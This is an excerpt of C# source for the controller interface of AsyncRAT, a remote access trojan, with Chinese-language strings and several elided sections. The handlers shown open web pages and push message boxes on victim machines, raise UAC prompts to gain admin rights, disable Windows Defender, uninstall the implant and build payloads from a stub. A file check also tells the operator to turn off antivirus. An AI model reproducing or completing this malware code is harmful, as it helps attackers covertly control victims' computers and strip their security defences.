    ...
    public partial class Form1 : Form
    {
        ...
        private void CheckFiles()
        {
            try
            {
                ...
                {
                    MessageBox.Show("缺失 " + Path.GetFileName(Application.ExecutablePath) + ".config");
                    Environment.Exit(0);
                }

                if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
                    MessageBox.Show("Stub文件夹缺失!重新解压文件并确保杀毒软件关闭");
        ...
        private void VisitWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string url = Interaction.InputBox("访问网页", "网址", "https://www.google.com");
        ...
        private void SendMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                string Msgbox = Interaction.InputBox("请输入要发送的信息", "信息框", "Hello World!");
        ...
        private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "弹出UAC提示?", "AsyncRAT | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
        ...
        private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "仅在具有管理员权限的客户端上执行！", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
        ...
        {
            DialogResult dialogResult = MessageBox.Show(this, "你确定要卸载吗?", "AsyncRAT | Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (dialogResult == DialogResult.Yes)
            {
                try
                {
        ...
        {
#if DEBUG
            MessageBox.Show("无法使用“调试”版本进行生成，请使用“发布”版本", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
#endif
